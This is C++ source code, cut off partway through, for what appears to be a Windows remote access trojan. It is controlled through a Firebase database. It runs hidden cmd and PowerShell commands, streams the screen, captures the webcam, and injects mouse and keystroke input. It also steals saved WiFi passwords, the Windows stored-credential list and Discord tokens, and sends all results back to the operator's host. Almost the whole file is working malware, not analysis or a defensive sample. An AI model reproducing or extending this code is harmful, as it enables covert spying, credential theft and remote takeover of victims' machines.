#include <iostream>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include <sstream>
#include <vector>
#include <gdiplus.h>
#include <vfw.h>
#include <tlhelp32.h>
#include <mmsystem.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")
using namespace Gdiplus;

std::string computerName;
std::string publicIP;
bool g_noPing=false;
const std::string FB_URL="solix-710c0-default-rtdb.europe-west1.firebasedatabase.app";

std::string getComputerName() {
    char buf[MAX_PATH]; DWORD sz = MAX_PATH;
    GetComputerNameA(buf, &sz);
    return std::string(buf, sz);
}

std::string getTimestamp() {
    SYSTEMTIME st; GetSystemTime(&st);
    char buf[32]; sprintf(buf,"%04d-%02d-%02dT%02d:%02d:%02dZ",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
    return std::string(buf);
}

std::string httpsPost(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(FB_URL.begin(),FB_URL.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"POST", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsPut(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(FB_URL.begin(),FB_URL.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"PUT", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsPatch(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(FB_URL.begin(),FB_URL.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"PATCH", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsGet(const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(FB_URL.begin(),FB_URL.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsDelete(const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(FB_URL.begin(),FB_URL.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return "";
}

std::string httpsGetUrl(const std::string& host, const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(host.begin(),host.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string getPublicIP() {
    std::string r = httpsGetUrl("api.ipify.org", "/");
    if(r.empty()) r = httpsGetUrl("icanhazip.com", "/");
    while(!r.empty()&&(r.back()=='\n'||r.back()=='\r')) r.pop_back();
    return r.empty()?"unknown":r;
}

std::string fbUrl(const std::string& p) {
    return "/" + p + ".json";
}

std::string fbEsc(const std::string& s) {
    std::string o;
    for(char c:s){if(c=='/'||c=='.'||c=='#'||c=='$'||c=='['||c==']')o+='_';else o+=c;}
    return o;
}

std::string base64Encode(const unsigned char* data, size_t len) {
    DWORD outLen=0;
    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen);
    std::string out(outLen, 0);
    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &outLen);
    out.resize(outLen);
    return out;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num=0, size=0;
    GetImageEncodersSize(&num, &size);
    if(size==0) return -1;
    std::vector<unsigned char> buf(size);
    ImageCodecInfo* p=(ImageCodecInfo*)buf.data();
    GetImageEncoders(num, size, p);
    for(UINT i=0;i<num;i++,p++){
        if(wcscmp(p->MimeType,format)==0){*pClsid=p->Clsid;return i;}
    }
    return -1;
}

struct MonInfo{int x,y,w,h;};
int enumMon(HMONITOR m, HDC, RECT* r, LPARAM lp){
    std::vector<MonInfo>* v=(std::vector<MonInfo>*)lp;
    v->push_back({r->left,r->top,r->right-r->left,r->bottom-r->top});
    return 1;
}
std::vector<MonInfo> getMonitors(){
    std::vector<MonInfo> v;
    EnumDisplayMonitors(0,0,enumMon,(LPARAM)&v);
    return v;
}

std::string takeScreenshot(int monitorIdx, int quality=80) {
    auto mons=getMonitors();
    int x=0,y=0,w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
    if(monitorIdx>=0&&monitorIdx<(int)mons.size()){
        x=mons[monitorIdx].x; y=mons[monitorIdx].y;
        w=mons[monitorIdx].w; h=mons[monitorIdx].h;
    } else if(monitorIdx==-1){
        x=GetSystemMetrics(SM_XVIRTUALSCREEN);
        y=GetSystemMetrics(SM_YVIRTUALSCREEN);
        w=GetSystemMetrics(SM_CXVIRTUALSCREEN);
        h=GetSystemMetrics(SM_CYVIRTUALSCREEN);
    }
    HDC dc=GetDC(0), mem=CreateCompatibleDC(dc);
    HBITMAP bmp=CreateCompatibleBitmap(dc,w,h);
    SelectObject(mem,bmp);
    BitBlt(mem,0,0,w,h,dc,x,y,SRCCOPY);
    ReleaseDC(0,dc);
    Bitmap* gbmp=Bitmap::FromHBITMAP(bmp,0);
    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
    EncoderParameters ep; ULONG q=quality;
    ep.Count=1; ep.Parameter[0].Guid=EncoderQuality;
    ep.Parameter[0].NumberOfValues=1;
    ep.Parameter[0].Type=EncoderParameterValueTypeLong;
    ep.Parameter[0].Value=&q;
    IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
    gbmp->Save(is,&jpegClsid,&ep);
    DeleteObject(bmp); delete gbmp;
    STATSTG st; is->Stat(&st,STATFLAG_NONAME);
    ULONG sz=(ULONG)st.cbSize.LowPart;
    std::vector<unsigned char> d(sz);
    LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
    ULONG rr=0; is->Read(d.data(),sz,&rr); is->Release();
    return base64Encode(d.data(),d.size());
}

std::string takeScreenshotScaled(int monitorIdx, int quality, float scale) {
    auto mons = getMonitors();
    int ox=0, oy=0, ow=GetSystemMetrics(SM_CXSCREEN), oh=GetSystemMetrics(SM_CYSCREEN);
    if(monitorIdx>=0 && monitorIdx<(int)mons.size()) {
        ox=mons[monitorIdx].x; oy=mons[monitorIdx].y;
        ow=mons[monitorIdx].w; oh=mons[monitorIdx].h;
    } else if(monitorIdx==-1) {
        ox=GetSystemMetrics(SM_XVIRTUALSCREEN);
        oy=GetSystemMetrics(SM_YVIRTUALSCREEN);
        ow=GetSystemMetrics(SM_CXVIRTUALSCREEN);
        oh=GetSystemMetrics(SM_CYVIRTUALSCREEN);
    }
    HDC dc=GetDC(0);
    HDC mem=CreateCompatibleDC(dc);
    HBITMAP bmp=CreateCompatibleBitmap(dc, ow, oh);
    SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, ow, oh, dc, ox, oy, SRCCOPY);
    ReleaseDC(0, dc);
    Bitmap* src = Bitmap::FromHBITMAP(bmp, 0);
    DeleteObject(bmp);
    int sw = (int)(ow * scale), sh = (int)(oh * scale);
    if (sw < 1) sw = 1; if (sh < 1) sh = 1;
    Bitmap* dst = new Bitmap(sw, sh, PixelFormat24bppRGB);
    Graphics g(dst);
    g.SetInterpolationMode(InterpolationModeBilinear);
    g.DrawImage(src, 0, 0, sw, sh);
    delete src;
    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg", &jpegClsid);
    EncoderParameters ep; ULONG q = quality;
    ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality;
    ep.Parameter[0].NumberOfValues = 1;
    ep.Parameter[0].Type = EncoderParameterValueTypeLong;
    ep.Parameter[0].Value = &q;
    IStream* is = 0; CreateStreamOnHGlobal(0, TRUE, &is);
    dst->Save(is, &jpegClsid, &ep);
    delete dst;
    STATSTG st; is->Stat(&st, STATFLAG_NONAME);
    ULONG sz = (ULONG)st.cbSize.LowPart;
    std::vector<unsigned char> data(sz);
    LARGE_INTEGER li = {}; is->Seek(li, STREAM_SEEK_SET, 0);
    ULONG rr = 0; is->Read(data.data(), sz, &rr);
    is->Release();
    return base64Encode(data.data(), data.size());
}

std::string captureWebcam() {
    HWND hWndC=capCreateCaptureWindowA("Webcam",WS_CHILD,0,0,320,240,GetDesktopWindow(),1);
    if(!hWndC) return "";
    capDriverConnect(hWndC,0);
    capGrabFrameNoStop(hWndC);
    std::string result;
    if(OpenClipboard(0)){
        HBITMAP hBmp=(HBITMAP)GetClipboardData(CF_BITMAP);
        if(hBmp){
            Bitmap bmp(hBmp,NULL);
            CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
            IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
            bmp.Save(is,&jpegClsid,0);
            STATSTG st; is->Stat(&st,STATFLAG_NONAME);
            ULONG sz=(ULONG)st.cbSize.LowPart;
            std::vector<unsigned char> d(sz);
            LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
            ULONG r=0; is->Read(d.data(),sz,&r); is->Release();
            result=base64Encode(d.data(),d.size());
            DeleteObject(hBmp);
        }
        CloseClipboard();
    }
    capDriverDisconnect(hWndC);
    DestroyWindow(hWndC);
    return result;
}

std::string execCmd(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa={sizeof(sa),0,TRUE};
    HANDLE hRead,hWrite;
    CreatePipe(&hRead,&hWrite,&sa,0);
    STARTUPINFOA si={sizeof(si)};
    si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.wShowWindow=SW_HIDE;
    si.hStdOutput=hWrite;
    si.hStdError=hWrite;
    std::string full="cmd.exe /c "+cmd;
    PROCESS_INFORMATION pi={};
    if(!CreateProcessA(NULL,&full[0],0,0,TRUE,CREATE_NO_WINDOW,0,0,&si,&pi)){
        CloseHandle(hRead);CloseHandle(hWrite);return "err";
    }
    CloseHandle(hWrite);
    char buf[4096];std::string out;DWORD n;
    while(ReadFile(hRead,buf,4095,&n,0)&&n>0){buf[n]=0;out+=buf;}
    WaitForSingleObject(pi.hProcess,10000);
    CloseHandle(hRead);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    return out;
}

std::string jsonEscape(const std::string& s) {
    std::string out;
    for(char c:s){
        if(c=='\\')out+="\\\\";
        else if(c=='"')out+="\\\"";
        else if(c=='\n')out+="\\n";
        else if(c=='\r')out+="\\r";
        else if(c=='\t')out+="\\t";
        else if(c>=0&&c<0x20)continue;
        else out+=c;
    }
    return out;
}

std::string extractJson(const std::string& json, const std::string& key) {
    auto pos = json.find("\"" + key + "\":");
    if (pos == std::string::npos) return "";
    pos += key.size() + 3;
    auto valStart = json.find_first_not_of(" \t\n\r", pos);
    if (valStart == std::string::npos) return "";
    if (json[valStart] == '"') {
        valStart++;
        auto valEnd = json.find("\"", valStart);
        if (valEnd == std::string::npos) return "";
        return json.substr(valStart, valEnd - valStart);
    }
    auto valEnd = json.find_first_of(",} \t\n\r", valStart);
    if (valEnd == std::string::npos) valEnd = json.size();
    return json.substr(valStart, valEnd - valStart);
}

std::string listDir(const std::string& path) {
    std::string searchPath = path;
    if(searchPath.empty()){
        DWORD drives=GetLogicalDrives();
        std::string out="[";
        for(int i=0;i<26;i++){
            if(drives&(1<<i)){
                char d[4]={(char)('A'+i),':','\\',0};
                ULONG sn,maxComp,flags;
                GetVolumeInformationA(d,0,0,&sn,&maxComp,&flags,0,0);
                if(out.size()>1) out+=",";
                out+="{\"n\":\"";out.push_back(d[0]);out+=":\",\"s\":0,\"d\":true,\"m\":\"Drive ";
                out.push_back(d[0]);out+="\"}";
            }
        }
        out+="]";
        return out;
    }
    std::string norm = searchPath;
    if(norm.back()!='\\') norm+="\\";
    std::string spec = norm + "*";
    std::string out="[";
    WIN32_FIND_DATAA fd;
    HANDLE h=FindFirstFileA(spec.c_str(),&fd);
    if(h!=INVALID_HANDLE_VALUE){
        do{
            std::string n=fd.cFileName;
            if(n=="."||n=="..") continue;
            if(out.size()>1) out+=",";
            out+="{\"n\":\""+jsonEscape(n)+"\",\"s\":"+std::to_string(fd.nFileSizeLow)+",\"d\":"+(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY?"true":"false")+",\"m\":\"";
            FILETIME ft=fd.ftLastWriteTime;
            SYSTEMTIME st;
            FileTimeToSystemTime(&ft,&st);
            char mb[32];sprintf(mb,"%04d-%02d-%02d %02d:%02d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute);
            out+=mb;out+="\"}";
        }while(FindNextFileA(h,&fd));
        FindClose(h);
    }
    out+="]";
    return out;
}

std::string handleMouse(const std::string& payload) {
    std::string xs=extractJson(payload,"x");
    std::string ys=extractJson(payload,"y");
    std::string action=extractJson(payload,"action");
    if(xs.empty()||ys.empty()||action.empty()) return "bad_payload";
    int x=std::stoi(xs); int y=std::stoi(ys);
    int sw=GetSystemMetrics(SM_CXSCREEN); int sh=GetSystemMetrics(SM_CYSCREEN);
    DWORD f=MOUSEEVENTF_ABSOLUTE;
    if(action=="move") f|=MOUSEEVENTF_MOVE;
    else if(action=="down") f|=MOUSEEVENTF_LEFTDOWN;
    else if(action=="up") f|=MOUSEEVENTF_LEFTUP;
    else return "bad_action";
    INPUT in={0};in.type=INPUT_MOUSE;
    in.mi.dx=(x*65535)/sw; in.mi.dy=(y*65535)/sh;
    in.mi.dwFlags=f;
    SendInput(1,&in,sizeof(in));
    return "ok";
}

std::string handleKeyboard(const std::string& payload) {
    std::string ks=extractJson(payload,"key");
    std::string action=extractJson(payload,"action");
    if(ks.empty()||action.empty()) return "bad_payload";
    WORD vk=(WORD)std::stoi(ks);
    INPUT in={0};in.type=INPUT_KEYBOARD;
    in.ki.wVk=vk;
    if(action=="up") in.ki.dwFlags|=KEYEVENTF_KEYUP;
    SendInput(1,&in,sizeof(in));
    return "ok";
}

void sendPing() {
    std::string ts = getTimestamp();
    std::string body = "{\"ip\":\"" + publicIP + "\",\"created_at\":\"" + ts + "\"}";
    httpsPut("/pings/" + fbEsc(computerName) + ".json", body);
}

std::string listProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[]";
    PROCESSENTRY32 pe = {sizeof(pe)};
    std::string out = "[";
    BOOL ok = Process32First(snap, &pe);
    while (ok) {
        if (out.size() > 1) out += ",";
        out += "{\"n\":\"" + jsonEscape(pe.szExeFile) + "\",\"p\":" + std::to_string(pe.th32ProcessID) + "}";
        ok = Process32Next(snap, &pe);
    }
    CloseHandle(snap);
    out += "]";
    return out;
}

std::string killProcess(const std::string& payload) {
    int pid = 0;
    try { pid = std::stoi(payload); } catch(...) { return "bad_pid"; }
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) { TerminateProcess(h, 0); CloseHandle(h); return "ok"; }
    std::string cmd = "taskkill /f /pid " + std::to_string(pid);
    std::string r = execCmd(cmd);
    if (r.find("success") != std::string::npos || r.find("SUCCESS") != std::string::npos) return "ok";
    return "access_denied";
}

std::string getSystemInfo() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    ULARGE_INTEGER freeB, totalB, totalF;
    std::string disks = "[";
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char root[4] = {(char)('A'+i), ':', '\\', 0};
            if (GetDriveTypeA(root) == DRIVE_FIXED && GetDiskFreeSpaceExA(root, &freeB, &totalB, &totalF)) {
                if (disks.size() > 1) disks += ",";
                disks += "{\"d\":\"" + std::string(1, root[0]) + "\",\"t\":" + std::to_string(totalB.QuadPart / (1024*1024)) + ",\"f\":" + std::to_string(freeB.QuadPart / (1024*1024)) + "}";
            }
        }
    }
    disks += "]";
    char compName[MAX_PATH+1]; DWORD csz = MAX_PATH;
    GetComputerNameA(compName, &csz);
    std::string out = "{";
    out += "\"host\":\"" + jsonEscape(compName) + "\",";
    out += "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ",";
    out += "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ",";
    out += "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ",";
    out += "\"disks\":" + disks;
    out += "}";
    return out;
}

std::string getPasswords() {
    std::string out = "=== WiFi Passwords ===\n";
    std::string profiles = execCmd("netsh wlan show profiles");
    size_t pos = 0; int cnt = 0;
    while ((pos = profiles.find("All User Profile", pos)) != std::string::npos) {
        size_t colon = profiles.find(":", pos);
        if (colon == std::string::npos) break;
        size_t start = profiles.find_first_not_of(" \t\r\n", colon + 1);
        if (start == std::string::npos) break;
        size_t end = profiles.find("\r\n", start);
        if (end == std::string::npos) end = profiles.size();
        std::string name = profiles.substr(start, end - start);
        while (!name.empty() && (name.back() == ' ' || name.back() == '\r' || name.back() == '\n')) name.pop_back();
        if (name.empty()) { pos = end; continue; }
        cnt++;
        out += "\n[" + std::to_string(cnt) + "] " + name + "\n";
        std::string keyInfo = execCmd("netsh wlan show profile name=\"" + name + "\" key=clear");
        size_t kpos = keyInfo.find("Key Content");
        if (kpos != std::string::npos) {
            size_t kcolon = keyInfo.find(":", kpos);
            size_t kstart = keyInfo.find_first_not_of(" \t\r\n", kcolon + 1);
            size_t kend = keyInfo.find("\r\n", kstart);
            if (kend == std::string::npos) kend = keyInfo.find("\n", kstart);
            if (kend == std::string::npos) kend = keyInfo.size();
            out += "  Password: " + keyInfo.substr(kstart, kend - kstart) + "\n";
        } else out += "  Password: (not found/blank)\n";
        pos = end;
    }
    if (cnt == 0) out += "  (no WiFi profiles)\n";
    out += "\n=== Windows Credentials ===\n";
    out += execCmd("cmdkey /list");
    return out;
}

std::string getNetworkInfo() {
    std::string out = "=== IP Configuration ===\n";
    out += execCmd("ipconfig /all");
    out += "\n=== Active Connections ===\n";
    out += execCmd("netstat -an");
    out += "\n=== ARP Table ===\n";
    out += execCmd("arp -a");
    out += "\n=== Routing Table ===\n";
    out += execCmd("route print");
    return out;
}

std::string getServices() { return execCmd("sc query state= all"); }

std::string getInstalledApps() {
    return execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
}

std::string getDiscordTokens() {
    std::string out;
    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
    char ad[MAX_PATH];
    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
    if (adLen == 0 || adLen > MAX_PATH) return "Error: no AppData";
    std::string basePath(ad);
    auto isTC = [](char c){return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-';};
    for (const char* cl : clients) {
        std::string dir = basePath + "\\" + cl + "\\Local Storage\\leveldb\\";
        std::string found;
        for (const char* ext : {".ldb", ".log"}) {
            WIN32_FIND_DATAA fd;
            HANDLE hf = FindFirstFileA((dir + "*" + ext).c_str(), &fd);
            if (hf == INVALID_HANDLE_VALUE) continue;
            do {
                HANDLE f = CreateFileA((dir + fd.cFileName).c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
                if (f == INVALID_HANDLE_VALUE) continue;
                DWORD sz = GetFileSize(f, 0);
                if (sz > 0 && sz < 0xa00000) {
                    std::vector<char> buf(sz);
                    DWORD rd = 0;
                    if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
                        std::string s(buf.data(), rd);
                        // MFA tokens: mfa.XXXX
                        size_t p = 0;
                        while ((p = s.find("mfa.", p)) != std::string::npos) {
                            size_t e = p + 4;
                            while (e < s.size() && isTC(s[e])) e++;
                            std::string t = s.substr(p, e - p);
                            if (t.size() > 80 && t.size() < 100 && found.find(t) == std::string::npos) {
                                if (!found.empty()) found += "\n";
                                found += t;
                            }
                            p = e;
                        }
                        // Regular tokens: XXX.XXX.XXX
                        for (size_t i = 0; i < s.size(); i++) {
                            if (!isTC(s[i])) continue;
                            size_t a = i;
                            while (i < s.size() && isTC(s[i])) i++;
                            std::string s1 = s.substr(a, i - a);
                            if (s1.size() >= 20 && s1.size() <= 26 && i < s.size() && s[i] == '.') {
                                size_t j = i + 1;
                                if (j >= s.size()) break;
                                size_t b = j;
                                while (j < s.size() && isTC(s[j])) j++;
                                std::string s2 = s.substr(b, j - b);
                                if (s2.size() >= 4 && s2.size() <= 8 && j < s.size() && s[j] == '.') {
                                    j++;
                                    size_t c = j;
                                    while (j < s.size() && isTC(s[j])) j++;
                                    std::string s3 = s.substr(c, j - c);
                                    if (s3.size() >= 24 && s3.size() <= 30) {
                                        std::string t = s1 + "." + s2 + "." + s3;
                                        if (found.find(t) == std::string::npos) {
                                            if (!found.empty()) found += "\n";
                                            found += t;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                CloseHandle(f);
            } while (FindNextFileA(hf, &fd));
            FindClose(hf);
        }
        if (!found.empty())
            out += "[" + std::string(cl) + "]\n" + found + "\n\n";
    }
    if (out.empty()) out = "No Discord tokens found";
    return out;
}

DWORD WINAPI pollThread(LPVOID) {
    Sleep(3000);
    try{if(!g_noPing)sendPing();}catch(...){}
    int pingCtr=0;
    while(true) {
        Sleep(100);
        if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
        try {
            std::string path = "/commands/" + fbEsc(computerName) + ".json";
            std::string resp = httpsGet(path);
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != std::string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == std::string::npos) { pos++; continue; }
                std::string key = resp.substr(kStart + 1, pos - kStart - 1);
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                std::string item = resp.substr(objStart, objEnd - objStart - 1);
                std::string type = extractJson(item, "type");
                std::string payload = extractJson(item, "payload");
                std::string status = extractJson(item, "status");
                if (type.empty() || status != "pending") { pos = objEnd; continue; }
                std::string result = "";
                try {
                    if (type == "screenshot") {
                        int mi=0; try{mi=std::stoi(payload);}catch(...){}
                        result = takeScreenshot(mi);
                    } else if (type == "cmd") {
                        result = execCmd(payload.empty() ? "whoami" : payload);
                    } else if (type == "mouse") result = handleMouse(payload);
                    else if (type == "keyboard") result = handleKeyboard(payload);
                    else if (type == "screen") result = takeScreenshot(0);
                    else if (type == "webcam") result = captureWebcam();
                    else if (type == "file_list") result = listDir(payload.empty() ? "" : payload);
                    else if (type == "process_list") result = listProcesses();
                    else if (type == "system_info") result = getSystemInfo();
                    else if (type == "kill_process") result = killProcess(payload);
                    else if (type == "shutdown") result = execCmd("shutdown /s /t 0");
                    else if (type == "restart") result = execCmd("shutdown /r /t 0");
                    else if (type == "lock") { LockWorkStation(); result = "ok"; }
                    else if (type == "logoff") result = execCmd("shutdown /l");
                    else if (type == "msgbox") {
                        std::string t=extractJson(payload,"text");
                        std::string ti=extractJson(payload,"title");
                        MessageBoxA(NULL,t.c_str(),ti.empty()?"Remote":ti.c_str(),MB_OK);
                        result="ok";
                    } else if (type == "volume") {
                        int v=0; try{v=std::stoi(payload);}catch(...){v=-1;}
                        if(v<0||v>100) result="bad_val";
                        else{DWORD w=(DWORD)(v*65535/100);waveOutSetVolume(0,(w<<16)|w);result="ok";}
                    } else if (type == "clipboard") {
                        std::string r;
                        if(OpenClipboard(0)){
                            HANDLE h=GetClipboardData(CF_TEXT);
                            if(h){char*p=(char*)GlobalLock(h);if(p){r=p;GlobalUnlock(h);}}
                            CloseClipboard();
                        }
                        result=r.empty()?"empty":r;
                    } else if (type == "idle") {
                        LASTINPUTINFO l={sizeof(l)}; GetLastInputInfo(&l);
                        result=std::to_string((GetTickCount()-l.dwTime)/1000);
                    } else if (type == "powershell") result = execCmd("powershell -c "+payload);
                    else if (type == "uptime") result=std::to_string(GetTickCount64()/1000);
                    else if (type == "discord_tokens") result = getDiscordTokens();
                    else if (type == "passwords") result = getPasswords();
                    else if (type == "network_info") result = getNetworkInfo();
                    else if (type == "services") result = getServices();
                    else if (type == "installed_apps") result = getInstalledApps();
                    else result = "unknown_type";
                } catch(...) { result = "exec_err"; }
                std::string escaped = jsonEscape(result);
                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
                httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
                pos = objEnd;
            }
        } catch(...) {}
    }
    return 0;
}

DWORD WINAPI screenThread(LPVOID) {
    Sleep(3000);
    const float SCALE = 0.5f;
    const int TARGET_MS = 100;
    const int LIVE_QUALITY = 25;
    while(true) {
        DWORD t0 = GetTickCount();
        try {
            std::string b64 = takeScreenshotScaled(0, LIVE_QUALITY, SCALE);
            std::string escaped = jsonEscape(b64);
            std::string ts = getTimestamp();
            char scaleStr[16]; sprintf(scaleStr, "%.2f", SCALE);
